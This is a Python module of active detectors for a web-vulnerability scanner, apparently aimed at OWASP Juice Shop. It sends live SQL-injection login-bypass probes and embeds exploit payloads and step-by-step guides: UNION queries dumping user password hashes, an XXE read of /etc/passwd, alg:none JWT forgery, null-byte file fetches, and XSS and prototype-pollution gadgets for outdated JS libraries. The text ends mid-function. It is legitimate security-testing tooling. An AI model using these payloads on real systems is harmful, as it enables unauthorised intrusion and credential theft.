"""
Active detectors — CONFIRM real vulnerabilities against live endpoints.

Unlike the advisory guidance engine (which says "here is where/how to test"),
these send safe, non-destructive probes to the actual application and report
findings that are CONFIRMED with response evidence. They are deeply aware of
OWASP Juice Shop's real endpoints and map hits to specific challenges, while
staying generic enough to fire on any app.

SAFETY: only read/verify probes here. Destructive challenges (RCE/XXE/NoSQL DoS,
memory bomb, arbitrary file write — Juice Shop's "Danger Zone") are deliberately
NOT auto-fired; they remain advisory playbooks.
"""
from __future__ import annotations

import base64
import hashlib
import json
import random
import ssl
import string
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Optional

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE
UA = "RoundTable/2 detector"

# Auth material for authenticated scans (session passthrough), set per run by
# run_detectors(). Merged into every probe so detectors reach post-login surface.
_AUTH_HEADERS: dict[str, str] = {}


def _hlist_to_dict(headers) -> dict[str, str]:
    out: dict[str, str] = {}
    for h in headers or []:
        if isinstance(h, str) and ":" in h:
            k, v = h.split(":", 1)
            if k.strip():
                out[k.strip()] = v.strip()
    return out


# ── low-level HTTP ──────────────────────────────────────────────────────────
def _req(method, url, headers=None, data=None, timeout=12, retries=2):
    import time
    h = {"User-Agent": UA}
    if _AUTH_HEADERS:
        h.update(_AUTH_HEADERS)
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    last = (None, {}, "")
    for attempt in range(retries + 1):
        req = urllib.request.Request(url, data=body, headers=h, method=method)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=_CTX) as r:
                raw = r.read(300_000)
                return r.status, dict(r.headers), raw.decode("utf-8", "ignore")
        except urllib.error.HTTPError as e:  # a real HTTP status — not a transport failure
            try:
                raw = e.read(300_000).decode("utf-8", "ignore")
            except Exception:
                raw = ""
            return e.code, dict(e.headers), raw
        except Exception:
            last = (None, {}, "")
            if attempt < retries:
                time.sleep(1.0 + attempt)  # target may be briefly saturated by the scan
    return last


def _get(url, **kw):
    return _req("GET", url, **kw)


def _post(url, data, **kw):
    return _req("POST", url, data=data, **kw)


def _gid(*p):
    return "det_" + hashlib.sha1("|".join(p).encode()).hexdigest()[:9]


def _curl_first(tools):
    t = list(tools or [])
    if not any(str(x).lower().startswith("curl") for x in t):
        t = ["curl"] + t
    t.sort(key=lambda x: 0 if str(x).lower().startswith("curl") else 1)
    return t


def _finding(*, key, title, category, severity, surface, evidence, what, how,
             challenges=None, payloads=None, bypass=None, tools=None, curl_steps=None,
             references=None, remediation=None, tags=None, confidence=90):
    return {
        "id": _gid(key, surface),
        "key": key,
        "title": title,
        "category": category,
        "wstg": "",
        "severity": severity.upper(),
        "confidence": confidence,
        "confidence_label": "Confirmed" if confidence >= 85 else "High",
        "confirmed": confidence >= 85,
        "surface": surface,
        "evidence": evidence,
        "what_to_test": what,
        "how_to_test": how,
        "payloads": payloads or [],
        "bypass": bypass or [],
        "tools": _curl_first(tools),
        "curl_steps": curl_steps or [],
        "references": references or [],
        "challenges": challenges or [],
        "tags": (tags or []) + (["confirmed"] if confidence >= 85 else []),
        "remediation": remediation,
    }


# ── fingerprint ─────────────────────────────────────────────────────────────
def is_juice_shop(base: str) -> Optional[str]:
    st, _, body = _get(f"{base}/rest/admin/application-version")
    if st == 200 and body.strip().startswith("{") and "version" in body:
        try:
            return json.loads(body).get("version", "unknown")
        except Exception:
            return "unknown"
    st, _, body = _get(base)
    if "OWASP Juice Shop" in body:
        return "unknown"
    return None


# ── detectors ───────────────────────────────────────────────────────────────
def d_sqli_login(base):
    for payload in ("' OR 1=1--", "admin@juice-sh.op'--", "' OR true--"):
        st, _, body = _post(f"{base}/rest/user/login", {"email": payload, "password": "x"})
        if st == 200 and ("authentication" in body or '"token"' in body):
            return _finding(
                key="sqli-authbypass", title="SQL injection — authentication bypass (CONFIRMED)",
                category="Injection", severity="CRITICAL", surface=f"{base}/rest/user/login",
                evidence=f"POST /rest/user/login with email={payload!r} returned 200 + an auth token — login bypassed.",
                what="The login query is string-built; an injected boolean logs in as the first/admin user.",
                how=["Repeat the curl below and confirm you receive an authentication token.",
                     "Escalate: dump users with a UNION on /rest/products/search (see Database Schema)."],
                payloads=["' OR 1=1--", "admin@juice-sh.op'--"],
                tools=["curl", "Burp Suite", "sqlmap"],
                curl_steps=[{"desc": "Auth bypass", "cmd":
                    f"curl -sS -k -X POST {base}/rest/user/login -H 'Content-Type: application/json' "
                    f"--data-raw '{{\"email\":\"{payload}\",\"password\":\"x\"}}'"}],
                challenges=["Login Admin", "Login Jim", "Login Bender", "User Credentials"],
                references=[{"title": "WSTG-INPV-05 · SQL Injection", "url": "https://portswigger.net/web-security/sql-injection"}],
                remediation={"summary": "Use parameterized queries / an ORM binding for the login lookup; never string-build SQL from the email field.", "fixes": []},
                tags=["sqli", "auth", "injection"],
            )
    return None


def d_sqli_search(base):
    st, _, body = _get(f"{base}/rest/products/search?q=%27")
    markers = ("SQLITE_ERROR", "SequelizeDatabaseError", "syntax error", "SQLITE_", "near \"", "unrecognized token")
    if st and st >= 500 and any(m in body for m in markers) or (st == 500 and "error" in body.lower()):
        hit = next((m for m in markers if m in body), "500 SQL error")
        return _finding(
            key="sqli-search", title="SQL injection in product search (CONFIRMED)",
            category="Injection", severity="HIGH", surface=f"{base}/rest/products/search?q=",
            evidence=f"GET /rest/products/search?q=' returned {st} with SQL error marker: {hit!r}.",
            what="The search q parameter is concatenated into a SQL query, enabling UNION-based extraction.",
            how=["Reproduce with the curl below.",
                 "Build a UNION SELECT to exfiltrate the schema, then the Users table (email, password hash)."],
            payloads=["qwert')) UNION SELECT sql, '2','3','4','5','6','7','8','9' FROM sqlite_master--",
                      "qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"],
            tools=["curl", "Burp Suite", "sqlmap"],
            curl_steps=[{"desc": "Trigger SQL error", "cmd": f"curl -sS -k \"{base}/rest/products/search?q=%27\""}],
            challenges=["Database Schema", "User Credentials"],
            references=[{"title": "WSTG-INPV-05 · SQL Injection", "url": "https://portswigger.net/web-security/sql-injection"}],
            remediation={"summary": "Parameterize the search query; validate/escape the q parameter server-side.", "fixes": []},
            tags=["sqli", "injection"],
        )
    return None


def d_ftp(base):
    st, _, body = _get(f"{base}/ftp/")
    files_of_interest = {
        "acquisition.md": ("Confidential Document", "confidential"),
        "coupons_2013.md.bak": ("Forged Coupon / Poison Null Byte", "coupon source / null-byte target"),
        "package.json.bak": ("Vulnerable Library", "dependency manifest"),
        "eastere.gg": ("Easter Egg", "hidden file"),
        "legal.md": ("Confidential Document", "legal doc"),
        "encrypt.pyc": ("Nested Easter Egg", "crypto artifact"),
        "suspicious_errors.yml": ("Misplaced Signature File", "SIEM signature"),
    }
    accessible = []
    if st == 200 and ("Index of" in body or ".md" in body or ".bak" in body):
        accessible.append("/ftp/ directory listing")
    for f, (chal, note) in files_of_interest.items():
        s2, _, _ = _get(f"{base}/ftp/{f}")
        if s2 == 200:
            accessible.append(f"/ftp/{f} ({note})")
    if accessible:
        return _finding(
            key="ftp-exposure", title="Exposed /ftp static files — sensitive data (CONFIRMED)",
            category="Sensitive Data Exposure", severity="HIGH", surface=f"{base}/ftp/",
            evidence="Accessible: " + "; ".join(accessible[:8]),
            what="The /ftp folder serves confidential docs and forgotten backups directly.",
            how=["Download each file below.",
                 "For .bak/.md.bak blocked by extension filter, use a Poison Null Byte: append %2500.md."],
            payloads=["/ftp/coupons_2013.md.bak%2500.md", "/ftp/package.json.bak%2500.md"],
            tools=["curl", "browser"],
            curl_steps=[{"desc": "List /ftp", "cmd": f"curl -sS -k {base}/ftp/"},
                        {"desc": "Poison null byte fetch", "cmd": f"curl -sS -k '{base}/ftp/coupons_2013.md.bak%2500.md'"}],
            challenges=["Confidential Document", "Forged Coupon", "Poison Null Byte", "Vulnerable Library", "Easter Egg"],
            references=[{"title": "WSTG-CONF-04 · Backup/Unreferenced Files", "url": "https://owasp.org/www-project-web-security-testing-guide/"}],
            remediation={"summary": "Do not serve backup/confidential files from the web root; remove /ftp exposure and add extension allow-listing without null-byte bypass.", "fixes": []},
            tags=["disclosure", "secrets"],
        )
    return None


def d_metrics(base):
    st, _, body = _get(f"{base}/metrics")
    if st == 200 and ("# HELP" in body or "# TYPE" in body):
        return _finding(
            key="metrics", title="Prometheus metrics endpoint exposed (CONFIRMED)",
            category="Observability", severity="MEDIUM", surface=f"{base}/metrics",
            evidence="GET /metrics returned Prometheus exposition format (# HELP/# TYPE).",
            what="Unauthenticated metrics can leak internal counts, routes, and usage patterns.",
            how=["Fetch /metrics and review exposed series."],
            tools=["curl"],
            curl_steps=[{"desc": "Read metrics", "cmd": f"curl -sS -k {base}/metrics | head"}],
            challenges=["Exposed Metrics"],
            remediation={"summary": "Bind /metrics to an internal interface or require auth; do not expose it publicly.", "fixes": []},
            tags=["disclosure", "config"],
        )
    return None


def d_app_config(base):
    st, _, body = _get(f"{base}/rest/admin/application-configuration")
    if st == 200 and "config" in body:
        return _finding(
            key="app-config", title="Application configuration disclosed unauthenticated (CONFIRMED)",
            category="Security Misconfiguration", severity="MEDIUM", surface=f"{base}/rest/admin/application-configuration",
            evidence="GET /rest/admin/application-configuration returned the full app config without auth.",
            what="Public config leaks feature flags, theme, and challenge hints an attacker can leverage.",
            how=["Fetch the endpoint and review the JSON for secrets/flags (e.g., ctf/coupon settings)."],
            tools=["curl"],
            curl_steps=[{"desc": "Dump config", "cmd": f"curl -sS -k {base}/rest/admin/application-configuration"}],
            challenges=["Security Misconfiguration"],
            remediation={"summary": "Require authentication/authorization for admin configuration endpoints.", "fixes": []},
            tags=["disclosure", "config"],
        )
    return None


def d_error_handling(base):
    st, _, body = _get(f"{base}/rest/products/search?q[]=x")
    if st and st >= 400 and any(m in body for m in ("SequelizeDatabaseError", "at Function", "stack", "Error:", "SQLITE")):
        return _finding(
            key="error-handling", title="Verbose error / stack trace disclosure (CONFIRMED)",
            category="Security Misconfiguration", severity="MEDIUM", surface=f"{base}/rest/products/search",
            evidence=f"An array/malformed q parameter produced a {st} with an unhandled error/stack trace.",
            what="Inconsistent error handling leaks stack traces, ORM internals, and file paths.",
            how=["Send a malformed parameter and capture the verbose error body."],
            payloads=["?q[]=x", "?q=%27%29%29"],
            tools=["curl", "Burp Suite"],
            curl_steps=[{"desc": "Trigger error", "cmd": f"curl -sS -k \"{base}/rest/products/search?q[]=x\""}],
            challenges=["Error Handling"],
            remediation={"summary": "Return generic error responses; never leak stack traces to clients.", "fixes": []},
            tags=["config", "disclosure"],
        )
    return None


def d_scoreboard(base):
    st, _, idx = _get(base)
    if st != 200:
        return None
    import re
    for m in re.findall(r'(?:src|href)="([^"]*main[^"]*\.js)"', idx)[:3]:
        url = m if m.startswith("http") else base.rstrip("/") + "/" + m.lstrip("/")
        s2, _, js = _get(url)
        if s2 == 200 and "score-board" in js:
            return _finding(
                key="scoreboard", title="Hidden Score Board route present in JS bundle (CONFIRMED)",
                category="Security through Obscurity", severity="LOW", surface=f"{base}/#/score-board",
                evidence=f"'score-board' route found in the JS bundle ({url.split('/')[-1]}).",
                what="Client-side routing exposes hidden pages once the bundle is read.",
                how=["Open the app then browse to /#/score-board directly."],
                tools=["browser", "curl"],
                curl_steps=[{"desc": "Grep the bundle", "cmd": f"curl -sS -k {url} | grep -o score-board | head -1"}],
                challenges=["Score Board"],
                tags=["disclosure"],
            )
    return None


def d_rest_feedback(base):
    st, _, body = _get(f"{base}/api/Feedbacks/")
    if st == 200 and '"data"' in body and "comment" in body:
        return _finding(
            key="feedback-exposure", title="All customer feedback readable unauthenticated (CONFIRMED)",
            category="Broken Access Control", severity="MEDIUM", surface=f"{base}/api/Feedbacks/",
            evidence="GET /api/Feedbacks returned every feedback record (with comments/ratings) without auth.",
            what="Object collections exposed without authorization leak other users' content.",
            how=["Fetch the collection and review for sensitive comments / captcha answers."],
            tools=["curl"],
            curl_steps=[{"desc": "Read all feedback", "cmd": f"curl -sS -k {base}/api/Feedbacks/"}],
            challenges=["Five-Star Feedback", "Forged Feedback"],
            remediation={"summary": "Enforce authorization on collection endpoints; scope reads to the owning user where applicable.", "fixes": []},
            tags=["access-control", "idor"],
        )
    return None


def d_jwt(base):
    # Reuse the SQLi login to obtain a token, then inspect the JWT.
    st, _, body = _post(f"{base}/rest/user/login", {"email": "' OR 1=1--", "password": "x"})
    tok = ""
    try:
        tok = json.loads(body).get("authentication", {}).get("token", "") if st == 200 else ""
    except Exception:
        tok = ""
    if tok and tok.count(".") == 2:
        try:
            hdr = json.loads(base64.urlsafe_b64decode(tok.split(".")[0] + "=="))
        except Exception:
            hdr = {}
        return _finding(
            key="jwt", title="JWT in use — test signature/alg confusion", category="Broken Authentication",
            severity="HIGH", surface=f"{base}/rest/user/login", confidence=70,
            evidence=f"Session uses a JWT (alg={hdr.get('alg','?')}). Test alg:none and RSA→HMAC confusion.",
            what="Juice Shop accepts an unsigned (alg:none) JWT and an RSA-signed forgery for non-existent users.",
            how=["Decode the token; re-sign with alg 'none' impersonating jwtn3d@juice-sh.op.",
                 "For the RSA challenge, forge with the app's public key using HS256 confusion."],
            payloads=["{\"alg\":\"none\",\"typ\":\"JWT\"} . {\"email\":\"jwtn3d@juice-sh.op\"} ."],
            tools=["jwt_tool", "Burp JWT Editor", "curl"],
            curl_steps=[{"desc": "Grab a token", "cmd": f"curl -sS -k -X POST {base}/rest/user/login -H 'Content-Type: application/json' --data-raw '{{\"email\":\"'\\'' OR 1=1--\",\"password\":\"x\"}}'"}],
            challenges=["Unsigned JWT", "Forged Signed JWT"],
            references=[{"title": "WSTG-SESS-10 · JWT", "url": "https://portswigger.net/web-security/jwt"}],
            remediation={"summary": "Reject alg:none, pin the expected algorithm, and verify signatures against the correct key type.", "fixes": []},
            tags=["jwt", "auth"],
        )
    return None


def d_deprecated_b2b(base):
    st, _, body = _get(f"{base}/b2b/v1/orders")
    st2, _, _ = _get(f"{base}/b2b/v2/orders")
    if (st and st != 404) or (st2 and st2 != 404):
        return _finding(
            key="b2b", title="Deprecated B2B order interface reachable (CONFIRMED)",
            category="Security Misconfiguration", severity="MEDIUM", surface=f"{base}/b2b/v2/orders",
            evidence=f"/b2b order interface responded ({st or st2}) instead of 404 — legacy XML endpoint still live.",
            what="A not-fully-retired B2B endpoint that parses XML → XXE surface.",
            how=["POST XML to the B2B endpoint and test for XXE (external entity to /etc/passwd)."],
            payloads=["<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><order>&x;</order>"],
            tools=["curl", "Burp Suite"],
            curl_steps=[{"desc": "Probe B2B", "cmd": f"curl -sS -k -i {base}/b2b/v2/orders"}],
            challenges=["Deprecated Interface", "XXE Data Access"],
            remediation={"summary": "Retire deprecated interfaces fully; disable external entities in the XML parser.", "fixes": []},
            tags=["config", "xxe"],
        )
    return None


# ── technology + vulnerable-library fingerprinting (Wappalyzer / retire.js-style) ──
import re as _re
from urllib.parse import urljoin as _urljoin

# lib name from a resource filename, version from the filename
_FILE_LIB = [
    (_re.compile(r"angular[._/-]?(\d+)[._-](\d+)[._-](\d+)", _re.I), "AngularJS"),
    (_re.compile(r"jquery[._-]?v?(\d+)\.(\d+)\.(\d+)", _re.I), "jQuery"),
    (_re.compile(r"bootstrap[._-]?v?(\d+)\.(\d+)\.(\d+)", _re.I), "Bootstrap"),
    (_re.compile(r"lodash[._-]?v?(\d+)\.(\d+)\.(\d+)", _re.I), "Lodash"),
    (_re.compile(r"handlebars[._-]?v?(\d+)\.(\d+)\.(\d+)", _re.I), "Handlebars"),
    (_re.compile(r"moment[._-]?v?(\d+)\.(\d+)\.(\d+)", _re.I), "Moment.js"),
    (_re.compile(r"(?:dompurify|purify)[._-]?v?(\d+)\.(\d+)\.(\d+)", _re.I), "DOMPurify"),
    (_re.compile(r"vue[._-]?v?(\d+)\.(\d+)\.(\d+)", _re.I), "Vue"),
    (_re.compile(r"react[._-]?v?(\d+)\.(\d+)\.(\d+)", _re.I), "React"),
]
# lib version from file CONTENT (for files whose name lacks a version)
_CONTENT_LIB = [
    (_re.compile(r"AngularJS v(\d+\.\d+\.\d+)"), "AngularJS"),
    (_re.compile(r"full\s*:\s*['\"](\d+\.\d+\.\d+)['\"][\s\S]{0,80}?angular", _re.I), "AngularJS"),
    (_re.compile(r"jQuery JavaScript Library v(\d+\.\d+\.\d+)"), "jQuery"),
    (_re.compile(r"jQuery v(\d+\.\d+\.\d+)"), "jQuery"),
    (_re.compile(r"exports\.version\s*=\s*['\"](\d+\.\d+\.\d+)['\"]"), "React"),
    (_re.compile(r"Bootstrap v(\d+\.\d+\.\d+)"), "Bootstrap"),
    (_re.compile(r"moment\.js version\s*:\s*(\d+\.\d+\.\d+)", _re.I), "Moment.js"),
]


def _ver_t(v):
    p = [int(x) for x in _re.findall(r"\d+", v)[:3]]
    return tuple(p + [0] * (3 - len(p)))


def _lib_vuln(lib, ver):
    """
    If this library version is known-vulnerable, return a dict with the RISK,
    references, fix, and — crucially — how to EXPLOIT it (payloads + steps).
    Returns None for a safe version.
    """
    v = _ver_t(ver)
    R = lambda t, u: {"title": t, "url": u}
    if lib == "AngularJS":
        return dict(sev="HIGH", conf=88,
            risk=(f"AngularJS {ver} is end-of-life (Jan 2022) with XSS / expression-sandbox-escape CVEs "
                  f"(CVE-2020-7676, CVE-2019-10768). Any user input rendered inside an AngularJS-bound region "
                  f"becomes client-side template injection (CSTI) → arbitrary JavaScript execution."),
            refs=[R("AngularJS advisories (retire.js)", "https://github.com/RetireJS/retire.js"),
                  R("PortSwigger · Client-side template injection", "https://portswigger.net/web-security/cross-site-scripting"),
                  R("CVE-2020-7676", "https://nvd.nist.gov/vuln/detail/CVE-2020-7676")],
            fix="Migrate off AngularJS 1.x (unsupported). Until then, never bind untrusted input into AngularJS templates/expressions.",
            payloads=["{{7*7}}", "{{constructor.constructor('alert(document.domain)')()}}",
                      "{{$eval.constructor('alert(1)')()}}",
                      "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}"],
            how=["Find where user input is reflected inside the AngularJS app (ng-app scope) — a search box, blog comment, profile/username field.",
                 "Inject {{7*7}} — if the page renders 49, expressions are being evaluated (CSTI confirmed).",
                 "Escalate: AngularJS >= 1.6 removed the expression sandbox, so {{constructor.constructor('...')()}} runs arbitrary JS.",
                 "Confirm with alert(document.domain), then report CSTI → XSS."])
    if lib == "jQuery":
        jq_how = ["Find a DOM sink where jQuery inserts HTML from input: .html(), .append(), .prepend(), or $(userInput).",
                  "Inject the payload below; the version's htmlPrefilter/parsing flaw lets it execute despite naive filtering.",
                  "Confirm alert(document.domain), then report reflected/DOM XSS."]
        jq_pl = ["<img src=x onerror=alert(document.domain)>",
                 "<style><style /><img src=x onerror=alert(1)>",
                 "'><svg onload=alert(1)>"]
        if v < (1, 9, 0):
            return dict(sev="HIGH", conf=82, risk=f"jQuery {ver}: multiple XSS / selector-injection issues.",
                        refs=[R("CVE-2020-11022", "https://nvd.nist.gov/vuln/detail/CVE-2020-11022")],
                        fix="Upgrade jQuery to >= 3.5.0.", payloads=jq_pl, how=jq_how)
        if v < (3, 4, 0):
            return dict(sev="MEDIUM", conf=78, risk=f"jQuery {ver}: CVE-2019-11358 (prototype pollution via $.extend) + $() HTML XSS.",
                        refs=[R("CVE-2019-11358", "https://nvd.nist.gov/vuln/detail/CVE-2019-11358")],
                        fix="Upgrade jQuery to >= 3.5.0.",
                        payloads=jq_pl + ['$.extend(true, {}, JSON.parse(\'{"__proto__":{"x":1}}\'))'], how=jq_how)
        if v < (3, 5, 0):
            return dict(sev="MEDIUM", conf=78, risk=f"jQuery {ver}: CVE-2020-11022 / CVE-2020-11023 (XSS via htmlPrefilter).",
                        refs=[R("CVE-2020-11023", "https://nvd.nist.gov/vuln/detail/CVE-2020-11023")],
                        fix="Upgrade jQuery to >= 3.5.0.", payloads=jq_pl, how=jq_how)
        return None
    if lib == "Bootstrap":
        if (v[0] == 3 and v < (3, 4, 1)) or (v[0] == 4 and v < (4, 3, 1)):
            return dict(sev="MEDIUM", conf=76, risk=f"Bootstrap {ver}: CVE-2019-8331 — XSS via data-template / title in tooltip/popover.",
                        refs=[R("CVE-2019-8331", "https://nvd.nist.gov/vuln/detail/CVE-2019-8331")],
                        fix="Upgrade Bootstrap to >= 4.3.1 (or 3.4.1).",
                        payloads=['title=\'<img src=x onerror=alert(1)>\' data-toggle="tooltip"',
                                  'data-template=\'<div class="tooltip"><script>alert(1)</script></div>\''],
                        how=["Find a tooltip/popover whose title/content is user-controllable.",
                             "Inject HTML via title or data-template; the sanitizer flaw lets it execute.",
                             "Confirm alert(1) → report XSS."])
        return None
    if lib == "Lodash":
        if v < (4, 17, 21):
            return dict(sev="MEDIUM", conf=78, risk=f"Lodash {ver}: prototype pollution / command injection (CVE-2020-8203, CVE-2021-23337).",
                        refs=[R("CVE-2021-23337", "https://nvd.nist.gov/vuln/detail/CVE-2021-23337")],
                        fix="Upgrade lodash to >= 4.17.21.",
                        payloads=['{"__proto__":{"polluted":"yes"}}',
                                  '_.merge({}, JSON.parse(\'{"__proto__":{"x":1}}\')); ({}).x === 1'],
                        how=["Find where user JSON/params reach _.merge / _.defaultsDeep / _.set / _.zipObjectDeep.",
                             "Send a __proto__ payload to pollute Object.prototype (check ({}).x afterward).",
                             "Chain the polluted property to a sink (template, config flag) for XSS/RCE, then report."])
        return None
    if lib == "Handlebars":
        if v < (4, 7, 7):
            return dict(sev="HIGH", conf=80, risk=f"Handlebars {ver}: prototype pollution → RCE (CVE-2019-19919, CVE-2021-23369).",
                        refs=[R("CVE-2021-23369", "https://nvd.nist.gov/vuln/detail/CVE-2021-23369")],
                        fix="Upgrade Handlebars to >= 4.7.7.",
                        payloads=["{{#with \"constructor\"}}{{#with split as |a|}}...{{/with}}{{/with}}"],
                        how=["If the app compiles user-controlled templates, test server-side template injection.",
                             "Use the known Handlebars prototype-pollution gadget chain to reach RCE.",
                             "Confirm code execution in a safe way, then report."])
        return None
    if lib == "Moment.js":
        if v < (2, 29, 4):
            return dict(sev="MEDIUM", conf=74, risk=f"Moment.js {ver}: ReDoS / path traversal (CVE-2022-24785, CVE-2022-31129).",
                        refs=[R("CVE-2022-31129", "https://nvd.nist.gov/vuln/detail/CVE-2022-31129")],
                        fix="Upgrade moment to >= 2.29.4 or migrate to a maintained date library.",
                        payloads=["a very long crafted date string (thousands of chars) to a moment() parse path"],
                        how=["Find a request where a date/locale string is parsed by moment().",
                             "Send an oversized/crafted value and measure response latency (ReDoS).",
                             "For the locale path, test ../ traversal per CVE-2022-24785."])
        return None
    return None


def d_tech_libs(base):
    # Gather markup from the root + a few common routes so libraries loaded only
    # on inner pages (e.g. AngularJS on /blog) are still detected.
    hdrs0 = {}
    html_all = ""
    for i, path in enumerate(["", "/blog", "/catalog", "/login"]):
        st, h, html = _get(base + path)
        if i == 0:
            hdrs0 = h or {}
        if html:
            html_all += "\n" + html
    if not html_all.strip():
        return []

    resources, seen = [], set()
    for tag in _re.findall(r'<(?:script|link|img)[^>]+(?:src|href)=["\']([^"\']+)["\']', html_all, _re.I):
        u = _urljoin(base + "/", tag)
        if u not in seen:
            seen.add(u)
            resources.append(u)

    detected = {}  # lib -> (version, source_url)
    for url in resources:
        for pat, lib in _FILE_LIB:
            m = pat.search(url)
            if m and lib not in detected:
                detected[lib] = (".".join(m.groups()), url)
                break

    # content-based version sniffing for JS files (bounded)
    fetched = 0
    for url in resources:
        if fetched >= 10 or not url.lower().split("?")[0].endswith(".js"):
            continue
        _, _, body = _get(url)
        if not body:
            continue
        fetched += 1
        for pat, lib in _CONTENT_LIB:
            if lib in detected:
                continue
            m = pat.search(body)
            if m:
                detected[lib] = (m.group(1), url)

    techs = set()
    low = {k.lower(): v for k, v in (hdrs0 or {}).items()}
    if low.get("server"):
        techs.add("Server: " + low["server"])
    if low.get("x-powered-by"):
        techs.add("X-Powered-By: " + low["x-powered-by"])
    g = _re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)', html_all, _re.I)
    if g:
        techs.add("Generator: " + g.group(1))
    for lib, (ver, _u) in detected.items():
        techs.add(f"{lib} {ver}")
    if "ng-app" in html_all or "ng-controller" in html_all:
        techs.add("AngularJS (markup)")
    if "data-reactroot" in html_all or "_reactListening" in html_all:
        techs.add("React (markup)")

    findings = []
    if techs:
        findings.append(_finding(
            key="tech-detect", title="Technologies detected (fingerprint)",
            category="Technology", severity="INFO", surface=base, confidence=75,
            evidence="Detected: " + " · ".join(sorted(techs)[:24]),
            what="Component/version inventory (like Wappalyzer). Cross-check each version against known CVEs.",
            how=["Confirm versions in the served JS/asset files.",
                 "Run retire.js / OWASP Dependency-Check against the discovered libraries.",
                 "Match server/framework banners to CVE / ExploitDB."],
            tools=["retire.js", "Wappalyzer", "nuclei -t technologies", "curl"],
            references=[{"title": "OWASP A06: Vulnerable & Outdated Components",
                         "url": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"}],
            tags=["fingerprint", "tech"],
        ))

    for lib, (ver, url) in detected.items():
        vd = _lib_vuln(lib, ver)
        if not vd:
            continue
        how_steps = ([f"Confirm the exact version first: curl -sS -k {url} | head -c 500"]
                     + vd.get("how", [])
                     + ["Look up the exact CVEs (retire.js / Snyk / NVD) and confirm the vulnerable code path is reachable before reporting impact."])
        findings.append(_finding(
            key=f"vuln-lib-{lib.lower()}", title=f"Vulnerable JS dependency: {lib} {ver}",
            category="Vulnerable Components", severity=vd["sev"], surface=url, confidence=vd["conf"],
            evidence=f"Potential risk ({vd['sev']}): " + vd["risk"] + f"  (loaded from {url})",
            what=f"The app ships {lib} {ver} — a version with known public vulnerabilities. "
                 f"Below is how a pentester would exploit it (verify manually; Round Table does not auto-exploit).",
            how=how_steps,
            payloads=vd.get("payloads", []),
            tools=["retire.js", "Burp Suite", "browser devtools console", "curl"],
            curl_steps=[{"desc": "Fetch the library header to confirm the version",
                         "cmd": f"curl -sS -k {url} | head -c 500"}],
            references=vd["refs"],
            remediation={"summary": vd["fix"], "fixes": []},
            tags=["vuln-lib", "components", "fingerprint", "exploit-guidance"],
        ))
    return findings


def d_reflection(base):
    """
    Safe reflection / template-injection probe. Sends a benign unique marker and
    an arithmetic template payload to common query params on the root and CONFIRMS:
      - reflected input echoed unencoded (a real reflected-XSS sink), or
      - server-side template injection (7*7 evaluates to 49).
    Benign only — no executing payloads are sent; weaponization stays the human's
    job. (Client-side AngularJS CSTI is evaluated in-browser, so it is confirmed
    by the headless-DAST phase, not here — this catches server-side reflection.)
    """
    tok = "rt" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    marker = f'{tok}x"><{tok}h>'            # <{tok}h> surviving raw ⇒ HTML injection
    ssti_val = f'{tok}s{{{{7*7}}}}{tok}e'   # {tok}s49{tok}e ⇒ template evaluated
    params = ["q", "search", "searchTerm", "query", "s", "keyword", "name", "id", "redirect"]
    findings, seen_xss, seen_ssti = [], False, False
    for p in params:
        if seen_xss and seen_ssti:
            break
        if not seen_xss:
            _, hdr, body = _get(f"{base}/?{p}=" + urllib.parse.quote(marker))
            ct = (hdr.get("Content-Type") or hdr.get("content-type") or "").lower()
            if body and "html" in ct and f"<{tok}h>" in body:
                seen_xss = True
                findings.append(_finding(
                    key="reflect-xss", title="Reflected input echoed unencoded (XSS-confirmable)",
                    category="Injection", severity="HIGH", surface=f"{base}/?{p}=", confidence=86,
                    evidence=f"A benign HTML marker (<{tok}h>) injected via ?{p}= was reflected raw/unencoded in the HTML response.",
                    what="The parameter is a reflected-XSS sink — a benign HTML tag survives unescaped. "
                         "Weaponize with a script/event payload (manual); Round Table only proves reflection.",
                    how=["Reproduce with the curl below and confirm the marker tag appears unescaped.",
                         "Swap the marker for an executing payload and confirm it fires in a real browser.",
                         "Report reflected XSS with the exact parameter and HTML context."],
                    payloads=['"><img src=x onerror=alert(document.domain)>', "<svg onload=alert(document.domain)>"],
                    tools=["Burp Suite", "browser", "curl"],
                    curl_steps=[{"desc": "Reflect a benign marker", "cmd": f"curl -sS -k \"{base}/?{p}={marker}\""}],
                    references=[{"title": "PortSwigger · Reflected XSS", "url": "https://portswigger.net/web-security/cross-site-scripting/reflected"}],
                    remediation={"summary": "Context-encode all reflected output and add a strict Content-Security-Policy.", "fixes": []},
                    tags=["xss", "reflected", "confirmed", "exploit-guidance"],
                ))
        if not seen_ssti:
            _, _, body = _get(f"{base}/?{p}=" + urllib.parse.quote(ssti_val))
            if body and f"{tok}s49{tok}e" in body:
                seen_ssti = True
                findings.append(_finding(
                    key="ssti-confirm", title="Template expression evaluated (SSTI/CSTI confirmed)",
                    category="Injection", severity="HIGH", surface=f"{base}/?{p}=", confidence=88,
                    evidence=f"Injected {{{{7*7}}}} rendered as 49 (marker {tok}s49{tok}e) via ?{p}= — input reaches a template engine.",
                    what="Input is evaluated by a template engine → SSTI (server, may reach RCE) or CSTI (client, → XSS). "
                         "Fingerprint the engine and escalate manually.",
                    how=["Confirm 49 appears where 7*7 was injected (see curl below).",
                         "Fingerprint the engine (Jinja2/Twig/Freemarker/AngularJS) with engine-specific probes.",
                         "Use the matching sandbox-escape to reach RCE (server) or JS execution (client)."],
                    payloads=["{{7*7}}", "${7*7}", "#{7*7}", "{{constructor.constructor('alert(document.domain)')()}}"],
                    tools=["tplmap (manual)", "Burp Suite", "curl"],
                    curl_steps=[{"desc": "Evaluate 7*7", "cmd": f"curl -sS -k \"{base}/?{p}={ssti_val}\""}],
                    references=[{"title": "PortSwigger · SSTI", "url": "https://portswigger.net/web-security/server-side-template-injection"}],
